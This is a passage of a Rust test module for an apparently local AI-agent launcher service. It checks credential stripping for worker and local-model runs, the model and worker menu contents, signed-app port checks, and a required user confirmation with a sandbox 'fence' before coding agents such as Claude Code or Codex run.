                tmpdir: "/private/var/folders/t/job-1",
                model_token: token.then_some("tok.abcdefghijklmnop"),
                extra_read: None,
                run: Some(run),
            },
        );
        env.into_iter().map(|(k, _)| k).collect()
    }

    const BASE_ENV: [&str; 9] = [
        "HOME",
        "TMPDIR",
        "LANG",
        "PATH",
        "LOCAL_AGENT_JOB_ID",
        "LOCAL_AGENT_FOLDER",
        "LOCAL_AGENT_MODE",
        "LOCAL_AGENT_TOOL_PATH",
        "LOCAL_AGENT_DIR",
    ];

    fn with(extra: &[&str]) -> Vec<String> {
        BASE_ENV.iter().chain(extra).map(|k| k.to_string()).collect()
    }

    #[test]
    fn a_local_model_run_gets_no_relay_url_and_no_dev_key() {
        let dir = tempfile::tempdir().unwrap();
        let mut launch = launch_config(dir.path());
        launch.env_file = Some("/w/.env.local".into());
        let run = RunSpec {
            model: local(LocalServer::LmStudio, "qwen2.5-7b-instruct"),
            worker: None,
        };
        let local_keys = [
            "LOCAL_AGENT_API_ORIGIN",
            "LOCAL_AGENT_LOCAL_MODEL_BASE_URL",
            "LOCAL_AGENT_LOCAL_MODEL_ID",
            "LOCAL_AGENT_LOCAL_MODEL_SERVER",
        ];
        assert_eq!(
            env_keys(&launch, &run, true),
            with(&["LOCAL_AGENT_MODEL_TOKEN", local_keys[0], local_keys[1], local_keys[2], local_keys[3]]),
            "the session token stays, for the Native Intelligence tools; the relay URL doesn't"
        );
        assert_eq!(env_keys(&launch, &run, false), with(&local_keys), "nor the dev key");
        let mut env = vec![("LOCAL_AGENT_MODEL_BASE_URL".to_string(), "x".to_string())];
        run.apply(&mut env, &launch);
        let get = |k: &str| env.iter().find(|(key, _)| key == k).map(|(_, v)| v.as_str());
        assert_eq!(get("LOCAL_AGENT_MODEL_BASE_URL"), None);
        assert_eq!(get("LOCAL_AGENT_API_ORIGIN"), Some("https://nativeintelligence.test"));
        assert_eq!(get("LOCAL_AGENT_LOCAL_MODEL_BASE_URL"), Some("http://127.0.0.1:1234/v1"));
        assert_eq!(get("LOCAL_AGENT_LOCAL_MODEL_ID"), Some("qwen2.5-7b-instruct"));
        assert_eq!(get("LOCAL_AGENT_LOCAL_MODEL_SERVER"), Some("lmstudio"));
    }

    #[test]
    fn a_worker_run_gets_exactly_the_fence_and_its_cli() {
        let dir = tempfile::tempdir().unwrap();
        let mut launch = launch_config(dir.path());
        launch.env_file = Some("/w/.env.local".into());
        let run = RunSpec {
            model: ModelChoice::Relay,
            worker: Some(WorkerRun {
                worker: worker("codex"),
                adapter: dir.path().join("agent/workers/acp.sh"),
                acp_dir: dir.path().join("agent/acp").to_str().unwrap().into(),
                bin: "/opt/homebrew/bin/codex".into(),
                fence_dir: "/d/local-agent/fence".into(),
                closed_ports: vec![4123, 8799],
                tools_file: None,
            }),
        };
        let exact = with(&[
            "LOCAL_AGENT_WORKER",
            "LOCAL_AGENT_WORKER_BIN",
            "LOCAL_AGENT_ACP_DIR",
            "LOCAL_AGENT_FENCE_DIR",
            "LOCAL_AGENT_CLOSED_PORTS",
        ]);
        assert_eq!(env_keys(&launch, &run, true), exact, "no session token");
        assert_eq!(env_keys(&launch, &run, false), exact, "no dev key");
        let mut env = vec![
            ("LOCAL_AGENT_MODEL_BASE_URL".to_string(), "x".to_string()),
            ("LOCAL_AGENT_MODEL_TOKEN".to_string(), "t".to_string()),
            ("LOCAL_AGENT_DEV_ENV_FILE".to_string(), "/w/.env.local".to_string()),
        ];
        run.apply(&mut env, &launch);
        let acp = dir.path().join("agent/acp").display().to_string();
        assert_eq!(
            env,
            vec![
                ("LOCAL_AGENT_WORKER".to_string(), "codex".to_string()),
                ("LOCAL_AGENT_WORKER_BIN".to_string(), "/opt/homebrew/bin/codex".to_string()),
                ("LOCAL_AGENT_ACP_DIR".to_string(), acp),
                ("LOCAL_AGENT_FENCE_DIR".to_string(), "/d/local-agent/fence".to_string()),
                ("LOCAL_AGENT_CLOSED_PORTS".to_string(), "4123,8799".to_string()),
            ],
            "the registry id, the CLI and the agents' adapters; every Native Intelligence credential gone"
        );
        assert_eq!(run.entry(&launch), dir.path().join("agent/workers/acp.sh"));
        assert_eq!(RunSpec::default().entry(&launch), launch.launcher);
        assert_eq!(run.describe(true), "Codex at /opt/homebrew/bin/codex");
        // The relay's run is today's, untouched.
        assert_eq!(
            env_keys(&launch, &RunSpec::default(), true),
            with(&["LOCAL_AGENT_MODEL_BASE_URL", "LOCAL_AGENT_MODEL_TOKEN"])
        );
        assert_eq!(RunSpec::default().describe(true), "model relay");
        assert_eq!(RunSpec::default().describe(false), "dev model key");
    }

    #[test]
    fn one_adapter_for_every_worker_in_the_bundle_or_a_checkouts_build() {
        let dir = tempfile::tempdir().unwrap();
        let mut launch = launch_config(dir.path());
        launch.launcher = "/b/launcher/launcher.mjs".into();
        launch.agent_dir = "/b".into();
        let bundle = WorkerFiles {
            adapter: "/b/workers/acp.mjs".into(),
            registry: "/b/workers/registry.json".into(),
            acp_dir: "/b/acp".into(),
        };
        assert_eq!(WorkerFiles::for_launch(&launch), bundle);
        assert_eq!(WorkerFiles::for_agent(Path::new("/b"), false), bundle);
        // dev.json: the launcher runs from source, the workers from the build.
        launch.launcher = "/a/launcher/launcher.ts".into();
        launch.agent_dir = "/a".into();
        let checkout = WorkerFiles {
            adapter: "/a/.output/workers/acp.mjs".into(),
            registry: "/a/.output/workers/registry.json".into(),
            acp_dir: "/a/.output/acp".into(),
        };
        assert_eq!(WorkerFiles::for_launch(&launch), checkout);
        assert_eq!(WorkerFiles::for_agent(Path::new("/a"), true), checkout);
    }

    #[test]
    fn workers_need_the_adapter_the_registry_and_the_agents_adapters() {
        let dir = tempfile::tempdir().unwrap();
        let files = WorkerFiles::for_agent(dir.path(), false);
        assert!(!files.present() && files.registry_if_complete().is_none());
        std::fs::create_dir_all(dir.path().join("workers")).unwrap();
        std::fs::write(&files.adapter, "").unwrap();
        std::fs::write(&files.registry, REGISTRY).unwrap();
        assert!(!files.present(), "no acp folder");
        assert_eq!(files.registry_if_complete(), None);
        std::fs::create_dir_all(&files.acp_dir).unwrap();
        assert_eq!(files.registry_if_complete(), Some(registry()));
        std::fs::write(&files.registry, r#"{"x":{"label":"X","cli":"/bin/x"}}"#).unwrap();
        assert_eq!(files.registry_if_complete(), None, "a malformed registry is none");
        std::fs::write(&files.registry, " ".repeat(MAX_REGISTRY_BYTES as usize + 1)).unwrap();
        assert_eq!(files.registry_if_complete(), None, "nor an oversized one");
        std::fs::write(&files.registry, REGISTRY).unwrap();
        std::fs::remove_file(&files.adapter).unwrap();
        assert_eq!(files.registry_if_complete(), None, "no adapter");
    }

    /// The view for `stored` and `found`, as the actor computes it.
    fn view(choice: ModelChoice, found: Found, allowed: &[&str]) -> L4View {
        l4(choice, found, allowed).view
    }

    fn l4(choice: ModelChoice, found: Found, allowed: &[&str]) -> L4 {
        let mut l4 = L4 {
            stored: Stored {
                model: choice.to_stored(),
                allowed_workers: allowed.iter().map(|w| w.to_string()).collect(),
                worker_folders: Vec::new(),
            },
            found,
            looked: true,
            ..L4::default()
        };
        l4.refresh_view();
        l4
    }

    fn servers(list: Vec<Detected>) -> Found {
        Found {
            caps: BOTH,
            servers: Some(list),
            registry: None,
            clis: Vec::new(),
        }
    }

    #[test]
    fn with_nothing_to_pick_there_is_no_menu_and_the_relay_it_is() {
        assert!(!L4View::default().model_shown());
        for list in [
            vec![],
            vec![found(LocalServer::Ollama, false, &[]), found(LocalServer::LmStudio, false, &[])],
            // Up, but nothing to chat with (embedding models are dropped).
            vec![found(LocalServer::LmStudio, true, &[])],
        ] {
            assert!(!view(ModelChoice::Relay, servers(list.clone()), &[]).model_shown(), "{list:?}");
        }
        let up = vec![found(LocalServer::Ollama, true, &["llama3.1:8b"])];
        assert!(view(ModelChoice::Relay, servers(up.clone()), &[]).model_shown());
        // A bundle that can't run local models offers none.
        let old_bundle = Found {
            caps: Caps::default(),
            ..servers(up)
        };
        assert!(!view(ModelChoice::Relay, old_bundle.clone(), &[]).model_shown());
        // The way back to the relay is always there.
        let chosen = view(local(LocalServer::Ollama, "llama3.1:8b"), old_bundle, &[]);
        assert!(chosen.model_shown());
        assert!(chosen.model_menu().contains(&MenuLine::Note("This Build Can't Run a Local Model".into())));
        let unreadable = L4View {
            choice: None,
            ..L4View::default()
        };
        assert!(unreadable.model_shown());
        assert_eq!(unreadable.model_title(), "Model: Pick Again");
        assert!(matches!(unreadable.model_menu()[0], MenuLine::Choice { checked: false, .. }));
    }

    #[test]
    fn the_menu_lists_the_servers_with_models_and_checks_the_choice() {
        let v = view(
            ModelChoice::Relay,
            servers(vec![
                found(LocalServer::Ollama, true, &["llama3.1:8b", "qwen2.5-coder:14b"]),
                found(LocalServer::LmStudio, false, &[]),
            ]),
            &[],
        );
        assert_eq!(v.model_title(), "Model: Native Intelligence");
        assert_eq!(
            v.model_menu(),
            vec![
                choice("relay", "Native Intelligence (Cloud)", true),
                MenuLine::Separator,
                MenuLine::Note("Ollama on This Mac".into()),
                choice("ollama:llama3.1:8b", "llama3.1:8b", false),
                choice("ollama:qwen2.5-coder:14b", "qwen2.5-coder:14b", false),
            ],
            "LM Studio isn't running: not mentioned"
        );
        let both = view(
            local(LocalServer::LmStudio, "qwen2.5-7b-instruct"),
            servers(vec![
                found(LocalServer::Ollama, true, &["llama3.1:8b"]),
                found(LocalServer::LmStudio, true, &["qwen2.5-7b-instruct"]),
            ]),
            &[],
        );
        assert_eq!(both.model_title(), "Model: qwen2.5-7b-instruct");
        assert_eq!(
            both.model_menu(),
            vec![
                choice("relay", "Native Intelligence (Cloud)", false),
                MenuLine::Separator,
                MenuLine::Note("Ollama on This Mac".into()),
                choice("ollama:llama3.1:8b", "llama3.1:8b", false),
                MenuLine::Note("LM Studio on This Mac".into()),
                choice("lmstudio:qwen2.5-7b-instruct", "qwen2.5-7b-instruct", true),
            ]
        );
    }

    #[test]
    fn the_chosen_model_stays_in_the_menu_when_its_server_is_down() {
        let chosen = local(LocalServer::LmStudio, "qwen2.5-7b-instruct");
        let item = choice("lmstudio:qwen2.5-7b-instruct", "qwen2.5-7b-instruct", true);
        let down = view(chosen.clone(), servers(vec![found(LocalServer::LmStudio, false, &[])]), &[]);
        assert_eq!(
            down.model_menu(),
            vec![
                choice("relay", "Native Intelligence (Cloud)", false),
                MenuLine::Separator,
                MenuLine::Note("LM Studio: Not Running".into()),
                item.clone(),
            ]
        );
        let other = view(chosen, servers(vec![found(LocalServer::LmStudio, true, &["other"])]), &[]);
        assert!(other.model_menu().contains(&item));
        let long = view(local(LocalServer::Ollama, &"m".repeat(100)), Found::default(), &[]);
        assert!(long.model_title().chars().count() < 50 && long.model_title().ends_with('…'));
    }

    #[test]
    fn a_server_whose_port_isnt_its_makers_says_why_in_the_menu() {
        let squatted = Detected {
            refused: Some(NOT_SIGNED),
            ..Detected::down(LocalServer::Ollama)
        };
        // Nothing to pick, but the menu is there to say why Ollama isn't used.
        let relay = view(ModelChoice::Relay, servers(vec![squatted.clone()]), &[]);
        assert!(relay.model_shown());
        assert_eq!(
            relay.model_menu(),
            vec![
                choice("relay", "Native Intelligence (Cloud)", true),
                MenuLine::Separator,
                MenuLine::Note("Ollama: Not Used (Not Its Signed App)".into()),
            ]
        );
        // The chosen model stays, under that reason instead of "Not Running".
        let chosen = view(local(LocalServer::Ollama, "llama3.1:8b"), servers(vec![squatted]), &[]);
        assert_eq!(
            chosen.model_menu()[2..],
            [
                MenuLine::Note("Ollama: Not Used (Not Its Signed App)".into()),
                choice("ollama:llama3.1:8b", "llama3.1:8b", true),
            ]
        );
        // A bundle that runs no local model shows nothing for it.
        let mut none = servers(vec![Detected {
            refused: Some(NOT_YOURS),
            ..Detected::down(LocalServer::LmStudio)
        }]);
        none.caps.local_model = false;
        assert!(!view(ModelChoice::Relay, none, &[]).model_shown());
    }

    #[test]
    fn the_menu_lists_at_most_fifteen_models_per_server_plus_the_chosen_one() {
        let ids: Vec<String> = (0..40).map(|i| format!("m{i}")).collect();
        let refs: Vec<&str> = ids.iter().map(String::as_str).collect();
        let list = servers(vec![found(LocalServer::Ollama, true, &refs)]);
        let count = |v: &L4View| {
            v.model_menu()
                .iter()
                .filter(|l| matches!(l, MenuLine::Choice { id, .. } if id != "relay"))
                .count()
        };
        assert_eq!(count(&view(ModelChoice::Relay, list.clone(), &[])), MENU_MODELS);
        let deep = view(local(LocalServer::Ollama, "m33"), list, &[]);
        assert_eq!(count(&deep), MENU_MODELS + 1);
        assert!(deep.model_menu().contains(&choice("ollama:m33", "m33", true)));
    }

    #[test]
    fn coding_agents_are_offered_only_when_installed_and_run_by_the_bundle() {
        let clis = |caps: Caps, clis: &[&str]| Found {
            caps,
            servers: None,
            registry: Some(registry()),
            clis: clis.iter().map(|c| c.to_string()).collect(),
        };
        assert!(!view(ModelChoice::Relay, clis(BOTH, &[]), &[]).workers_shown(), "nothing installed");
        assert!(
            !view(ModelChoice::Relay, clis(Caps::default(), &["claude-code"]), &[]).workers_shown(),
            "a bundle without workers"
        );
        let no_registry = Found {
            registry: None,
            ..clis(BOTH, &["claude-code"])
        };
        assert!(!view(ModelChoice::Relay, no_registry, &[]).workers_shown(), "a bundle without a registry");
        let v = view(ModelChoice::Relay, clis(BOTH, &["claude-code", "codex"]), &[]);
        assert_eq!(
            v.workers_menu(),
            vec![
                choice(
                    "claude-code",
                    "Allow Claude Code (your own Claude Code account, with network access)",
                    false
                ),
                choice("codex", "Allow Codex (your own Codex account, with network access)", false),
            ],
            "each from the registry's label"
        );
        // Allowed and since uninstalled (or an older bundle): still there, to take back.
        let kept = view(ModelChoice::Relay, clis(Caps::default(), &[]), &["codex"]);
        assert_eq!(
            kept.workers_menu(),
            vec![choice("codex", "Allow Codex (your own Codex account, with network access)", true)]
        );
        assert!(kept.worker_allowed("codex") && !kept.worker_allowed("claude-code"));
        // One the registry no longer lists (or before Rust read it): named by
        // its id; a stored id of another shape is left out.
        let gone = view(ModelChoice::Relay, Found::default(), &["cursor", "Not An Id"]);
        assert_eq!(gone.workers_menu(), vec![choice("cursor", "Allow cursor (not in this build)", true)]);
    }

    #[test]
    fn the_status_offers_what_a_start_may_name_right_now() {
        let found = |caps: Caps| Found {
            caps,
            servers: None,
            registry: Some(registry()),
            clis: vec!["claude-code".into(), "codex".into()],
        };
        let offer = |id: &str, label: &str| WorkerOffer {
            id: id.into(),
            label: label.into(),
        };
        assert_eq!(l4(ModelChoice::Relay, found(BOTH), &[]).offered(), Vec::<WorkerOffer>::new(), "nothing allowed");
        assert_eq!(
            l4(ModelChoice::Relay, found(BOTH), &["codex", "cursor"]).offered(),
            vec![offer("codex", "Codex")],
            "allowed, listed and installed"
        );
        let installed_one = Found {
            clis: vec!["claude-code".into()],
            ..found(BOTH)
        };
        assert_eq!(
            l4(ModelChoice::Relay, installed_one, &["codex", "claude-code"]).offered(),
            vec![offer("claude-code", "Claude Code")]
        );
        assert_eq!(l4(ModelChoice::Relay, found(Caps::default()), &["codex"]).offered(), Vec::<WorkerOffer>::new());
        assert_eq!(
            l4(local(LocalServer::Ollama, "m"), found(BOTH), &["codex"]).offered(),
            Vec::<WorkerOffer>::new(),
            "a local model refuses workers"
        );
    }

    // The actor end to end, against sh stand-ins like tests.rs's.

    #[derive(Default)]
    struct Recorder {
        events: Mutex<Vec<EventPayload>>,
        trays: Mutex<Vec<TrayView>>,
        /// Every worker confirm shown.
        asked: Mutex<Vec<super::super::prompts::NativePrompt>>,
        /// The person's answers, in order; with none left, yes.
        answers: Mutex<VecDeque<bool>>,
        /// Leave the confirms up, unanswered.
        hold: AtomicBool,
        open: Mutex<Vec<oneshot::Sender<bool>>>,
        notices: Mutex<Vec<(String, String)>>,
    }

    impl Host for Recorder {
        fn emit(&self, payload: &EventPayload) {
            self.events.lock().unwrap().push(payload.clone());
        }

        fn tray(&self, view: &TrayView) {
            self.trays.lock().unwrap().push(view.clone());
        }

        fn ask(&self, prompt: &super::super::prompts::NativePrompt, _timeout: Duration, answer: oneshot::Sender<bool>) {
            assert_eq!(
                prompt.deny,
                super::super::prompts::WORKER_DENY,
                "nothing here but a worker's confirm may ask the person: {prompt:?}"
            );
            self.asked.lock().unwrap().push(prompt.clone());
            if self.hold.load(Ordering::SeqCst) {
                self.open.lock().unwrap().push(answer);
                return;
            }
            let _ = answer.send(self.answers.lock().unwrap().pop_front().unwrap_or(true));
        }

        fn notify(&self, title: &str, body: &str) {
            self.notices.lock().unwrap().push((title.to_string(), body.to_string()));
        }
    }

    impl Recorder {
        async fn wait_for(&self, what: &str, pred: impl Fn(&EventPayload) -> bool) -> EventPayload {
            let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
            loop {
                if let Some(e) = self.events.lock().unwrap().iter().find(|e| pred(e)).cloned() {
                    return e;
                }
                assert!(
                    tokio::time::Instant::now() < deadline,
                    "timed out waiting for {what}; got {:#?}",
                    self.events.lock().unwrap()
                );
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        }

        fn last_tray(&self) -> Option<TrayView> {
            self.trays.lock().unwrap().last().cloned()
        }

        fn parked(&self) -> usize {
            self.events
                .lock()
                .unwrap()
                .iter()
                .filter(|e| e.event["reason"] == PARKED)
                .count()
        }
    }

    /// eve's launcher, or a worker's adapter: says which script ran and what
    /// it was given, then waits for a message (never answering one) or a stop.
    const STAND_IN: &str = r#"
# Our own agent's launcher names its eve server's port; a worker's adapter none.
if [ -z "$LOCAL_AGENT_WORKER" ]; then printf '{"type":"ready","port":4123}\n'; else printf '{"type":"ready","port":0}\n'; fi
while IFS= read -r line; do
  case "$line" in
    *'"type":"start"'*|*'"type":"resume"'*)
      printf '{"type":"session","sessionId":"%s","streamIndex":0}\n' "$LOCAL_AGENT_JOB_ID"
      printf '{"type":"event","event":{"kind":"text","delta":"script=%s|worker=%s|bin=%s|acp=%s|fence=%s|markers=%s|closed=%s|cwd=%s|local=%s|id=%s|relay=%s|token=%s|dev=%s|origin=%s"}}\n' "$(basename "$0")" "${LOCAL_AGENT_WORKER:-none}" "${LOCAL_AGENT_WORKER_BIN:-none}" "${LOCAL_AGENT_ACP_DIR:-none}" "${LOCAL_AGENT_FENCE_DIR:-none}" "$( [ -f "${LOCAL_AGENT_FENCE_DIR:-/none}/$LOCAL_AGENT_JOB_ID" ] && [ -f "${LOCAL_AGENT_FENCE_DIR:-/none}/$LOCAL_AGENT_JOB_ID.open" ] && echo yes || echo no )" "${LOCAL_AGENT_CLOSED_PORTS-none}" "$(pwd -P)" "${LOCAL_AGENT_LOCAL_MODEL_BASE_URL:-none}" "${LOCAL_AGENT_LOCAL_MODEL_ID:-none}" "${LOCAL_AGENT_MODEL_BASE_URL:-none}" "${LOCAL_AGENT_MODEL_TOKEN:-none}" "${LOCAL_AGENT_DEV_ENV_FILE:-none}" "${LOCAL_AGENT_API_ORIGIN:-none}"
      printf '{"type":"event","event":{"kind":"status","status":"waiting"}}\n'
      ;;
    *'"type":"token"'*)
      printf '{"type":"event","event":{"kind":"message","text":"got a token"}}\n'
      ;;
    *'"type":"send"'*)
      t=$(printf '%s' "$line" | sed 's/.*"text":"\([^"]*\)".*/\1/')
      printf '{"type":"event","event":{"kind":"message","text":"ran %s"}}\n' "$t"
      ;;
    *'"type":"stop"'*)
      printf '{"type":"event","event":{"kind":"status","status":"cancelled"}}\n'
      exit 0
      ;;
  esac
done
"#;

    const TOKEN: &str = "tok-test-0123456789abcdef";

    struct Rig {
        svc: LocalAgentService,
        rec: Arc<Recorder>,
        _dir: tempfile::TempDir,
        base: PathBuf,
        launch: LaunchConfig,
        grant: String,
        /// What the stand-in for the port check finds.
        servers: Arc<Mutex<Vec<Detected>>>,
        looks: Arc<AtomicUsize>,
        /// The fence's steps as the actor took them, in order (the real
        /// sweep runs; the login return is only recorded).
        fence_calls: Arc<Mutex<Vec<String>>>,
        logins: Arc<Mutex<Vec<super::super::fence::LoginReturn>>>,
    }

    fn rig_with(model_json: Option<&str>) -> Rig {
        rig_tuned(model_json, |_| {})
    }

    /// `tune`: the timing, before the actor starts.
    fn rig_tuned(model_json: Option<&str>, tune: impl FnOnce(&mut Timing)) -> Rig {
        let dir = tempfile::tempdir().unwrap();
        let base = std::fs::canonicalize(dir.path()).unwrap();
        let root = base.join("data/local-agent");
        let home = base.join("home");
        std::fs::create_dir_all(home.join("project")).unwrap();
        std::fs::create_dir_all(base.join("tmp")).unwrap();
        if let Some(json) = model_json {
            std::fs::create_dir_all(&root).unwrap();
            // `{base}`: the rig's own folder, for paths model.json names.
            std::fs::write(root.join(STORE_FILE), json.replace("{base}", base.to_str().unwrap())).unwrap();
        }
        let launch = launch_config(&base);
        std::fs::write(&launch.launcher, STAND_IN).unwrap();
        // The bundle's one adapter, its registry and the agents' adapters.
        std::fs::create_dir_all(base.join("agent/workers")).unwrap();
        std::fs::create_dir_all(base.join("agent/acp")).unwrap();
        std::fs::write(base.join("agent/workers/acp.sh"), STAND_IN).unwrap();
        std::fs::write(base.join("agent/workers/registry.json"), REGISTRY).unwrap();
        std::fs::write(
            base.join("agent/BUNDLE.json"),
            r#"{"capabilities":["local-model","workers"]}"#,
        )
        .unwrap();
        executable(&base.join("bin/claude"));
        executable(&base.join("bin/codex"));
        let paths = Paths {
            root: root.clone(),
            tmp_root: base.join("tmp"),
            home: home.clone(),
            protected: vec![base.join("data"), base.join("tmp")],
        };
        let resolver = Arc::new(Resolver::new(
            false,
            root.join("dev.json"),
            home.clone(),
            None,
            Arc::new(Runtime::new(RuntimeSpec::pinned(), root.join("runtime"), reqwest::Client::new())),
        ));
        let rec = Arc::new(Recorder::default());
        let mut timing = Timing {
            stop_term_after: Duration::from_millis(300),
            stop_kill_after: Duration::from_millis(600),
            worker_confirm: Duration::from_secs(1),
            worker_backoff: BACKOFF,
            ..Timing::default()
        };
        tune(&mut timing);
        let (svc, mut actor) = LocalAgentService::with_host(rec.clone(), paths, timing, resolver, true);
        let servers = Arc::new(Mutex::new(Vec::new()));
        let looks = Arc::new(AtomicUsize::new(0));
        let (s, n) = (servers.clone(), looks.clone());
        actor.l4.detect = Arc::new(move || {
            n.fetch_add(1, Ordering::SeqCst);
            let found = s.lock().unwrap().clone();
            Box::pin(async move { found })
        });
        use super::super::fence;
        let fence_calls = Arc::new(Mutex::new(Vec::new()));
        let logins = Arc::new(Mutex::new(Vec::new()));
        let jobs = root.join("jobs");
        let (calls, seen, jobs_at) = (fence_calls.clone(), rec.clone(), jobs.clone());
        let (calls2, got, jobs_at2) = (fence_calls.clone(), logins.clone(), jobs);
        actor.fence = fence::Ops {
            sweep: Arc::new(move |dir: &Path, job: &str, scope: fence::Scope| {
                let branches = seen
                    .events
                    .lock()
                    .unwrap()
                    .iter()
                    .filter(|e| e.job_id == job && e.event["kind"] == "branch")
                    .count();
                calls.lock().unwrap().push(format!(
                    "sweep {scope:?} branches={branches} folder={}",
                    jobs_at.join(job).exists()
                ));
                fence::sweep(dir, job, scope)
            }),
            return_logins: Arc::new(move |job: &str, run: &fence::LoginReturn| {
                calls2.lock().unwrap().push(format!("logins folder={}", jobs_at2.join(job).exists()));
                got.lock().unwrap().push(run.clone());
            }),
        };
        tokio::spawn(actor.run());
        Rig {
            svc,
            rec,
            _dir: dir,
            base,
            launch,
            grant: String::new(),
            servers,
            looks,
            fence_calls,
            logins,
        }
    }

    async fn rig() -> Rig {
        let mut rig = rig_with(None);
        rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
        rig
    }

    impl Rig {
        fn args(&self, worker: Option<&str>) -> StartArgs {
            StartArgs {
                grant_id: self.grant.clone(),
                request: "fix the bug".into(),
                model_token: Some(TOKEN.into()),
                worker: worker.map(str::to_string),
                ..StartArgs::default()
            }
        }

        async fn start(&self, worker: Option<&str>) -> Result<String, String> {
            self.svc
                .start_with(self.args(worker), self.launch.clone())
                .await
                .map(|r| r.job_id)
        }

        async fn resume(&self, id: &str) -> Result<StartResult, String> {
            self.svc
                .resume_with(id.into(), Some(TOKEN.into()), self.launch.clone())
                .await
        }

        /// What the stand-in said it was given, by key.
        async fn given(&self, job: &str, nth: usize) -> BTreeMap<String, String> {
            let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
            loop {
                let texts: Vec<String> = self
                    .rec
                    .events
                    .lock()
                    .unwrap()
                    .iter()
                    .filter(|e| e.job_id == job && e.event["kind"] == "text")
                    .map(|e| e.event["delta"].as_str().unwrap().to_string())
                    .collect();
                if let Some(t) = texts.get(nth) {
                    return t
                        .split('|')
                        .filter_map(|kv| kv.split_once('='))
                        .map(|(k, v)| (k.to_string(), v.to_string()))
                        .collect();
                }
                assert!(tokio::time::Instant::now() < deadline, "no text #{nth} from {job}");
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        }

        async fn waiting(&self, job: &str) {
            self.rec
                .wait_for("waiting", |e| e.job_id == job && e.event["status"] == "waiting")
                .await;
        }

        async fn exit_of(&self, job: &str) -> EventPayload {
            self.rec
                .wait_for("the exit", |e| e.job_id == job && e.event["reason"].is_string())
                .await
        }

        fn fence_calls(&self) -> Vec<String> {
            self.fence_calls.lock().unwrap().clone()
        }

        fn on_disk(&self) -> Stored {
            Stored::load(&self.base.join("data/local-agent").join(STORE_FILE))
        }

        fn jobs_on_disk(&self) -> StateFile {
            StateFile::load(&self.base.join("data/local-agent/state.json")).unwrap()
        }

        /// The watcher's look, as if it had just run.
        async fn found(&self, servers: Vec<Detected>, clis: &[&str]) {
            *self.servers.lock().unwrap() = servers.clone();
            self.svc
                .cmds
                .send(super::super::Cmd::Workers(Cmd::Found(Found {
                    caps: BOTH,
                    servers: Some(servers),
                    registry: Some(registry()),
                    clis: clis.iter().map(|c| c.to_string()).collect(),
                })))
                .unwrap();
            // Ordered behind the message above.
            self.svc.models().await.unwrap();
        }

        async fn choose_local(&self, model: &str) {
            self.found(vec![found(LocalServer::Ollama, true, &[model])], &[]).await;
            self.svc.set_model(local(LocalServer::Ollama, model)).await.unwrap();
        }
    }

    #[tokio::test]
    async fn a_worker_needs_the_persons_yes_then_runs_its_adapter_without_the_relay() {
        let rig = rig().await;
        assert_eq!(
            rig.start(Some("claude-code")).await.unwrap_err(),
            "Claude Code isn't allowed on this Mac; the person can allow it in the menu bar's Local Agents → \
             Coding Agents"
        );
        assert!(rig.jobs_on_disk().jobs.is_empty() && rig.rec.events.lock().unwrap().is_empty());
        // The yes needs a bundle that runs workers (Rust has looked).
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        assert_eq!(rig.on_disk().allowed_workers, vec!["claude-code".to_string()]);
        rig.svc.models().await.unwrap();
        assert_eq!(
            rig.rec.last_tray().unwrap().l4.workers,
            vec![WorkerItem {
                id: "claude-code".into(),
                label: Some("Claude Code".into()),
                allowed: true,
            }],
            "the tray redraws with it"
        );
        assert_eq!(
            rig.svc.status().await.unwrap().workers,
            vec![WorkerOffer {
                id: "claude-code".into(),
                label: "Claude Code".into(),
            }],
            "and the page may now name it"
        );

        let id = rig.start(Some("claude-code")).await.unwrap();
        let got = rig.given(&id, 0).await;
        assert_eq!(got["script"], "acp.sh", "the one adapter");
        assert_eq!(got["worker"], "claude-code");
        assert_eq!(got["bin"], rig.base.join("bin/claude").display().to_string());
        assert_eq!(got["acp"], rig.base.join("agent/acp").display().to_string());
        // Its fence markers, made before it was spawned, outside every job's folder.
        assert_eq!(got["fence"], rig.base.join("data/local-agent/fence").display().to_string());
        assert_eq!(got["markers"], "yes", "both markers existed when the adapter started");
        assert_eq!(got["cwd"], rig.base.join("data/local-agent/jobs").join(&id).display().to_string());
        for k in ["relay", "token", "dev", "local", "origin"] {
            assert_eq!(got[k], "none", "{k}: a worker uses its vendor, not the relay or the session token");
        }
        assert_eq!(got["closed"], "", "no listener of ours runs yet");
        let eve = rig.start(None).await.unwrap();
        let theirs = rig.given(&eve, 0).await;
        assert_eq!((theirs["fence"].as_str(), theirs["markers"].as_str()), ("none", "no"), "eve's launcher has none");
        assert_eq!(theirs["closed"], "none", "nor closed ports");
        assert_eq!(rig.jobs_on_disk().job(&id).unwrap().worker.as_deref(), Some("claude-code"));
        // Same stop handling as eve's launcher; a resume brings the same worker back.
        rig.waiting(&id).await;
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        rig.resume(&id).await.unwrap();
        assert_eq!(rig.given(&id, 1).await["script"], "acp.sh");
        let mut other = rig.args(Some("codex"));
        other.job_id = Some(id.clone());
        assert_eq!(
            rig.svc.start_with(other, rig.launch.clone()).await.unwrap_err(),
            "this job runs on Claude Code"
        );
    }

    const SAID_NO: &str = "Claude Code didn't run: the person said no on this Mac";
    /// The rigs' hold-off after a no.
    const BACKOFF: Duration = Duration::from_millis(300);

    async fn past_the_backoff() {
        tokio::time::sleep(BACKOFF + Duration::from_millis(100)).await;
    }

    #[tokio::test]
    async fn every_worker_launch_waits_for_a_yes_on_the_mac_and_a_no_runs_nothing() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let args = StartArgs {
            job_id: Some(uuid::Uuid::new_v4().to_string()),
            ..rig.args(Some("claude-code"))
        };
        rig.rec.answers.lock().unwrap().push_back(false);
        assert_eq!(
            rig.svc.start_with(args.clone(), rig.launch.clone()).await.unwrap_err(),
            SAID_NO
        );
        let asked = rig.rec.asked.lock().unwrap().clone();
        assert_eq!(asked.len(), 1);
        assert_eq!(asked[0].title, "Let Claude Code work in project?");
        let folder = rig.base.join("home/project").display().to_string();
        assert!(
            asked[0].body.contains(&format!("run your own Claude Code, on your own account and with network access, in {folder}"))
                && asked[0].body.contains("Its task: \u{201C}fix the bug\u{201D}"),
            "{}",
            asked[0].body
        );
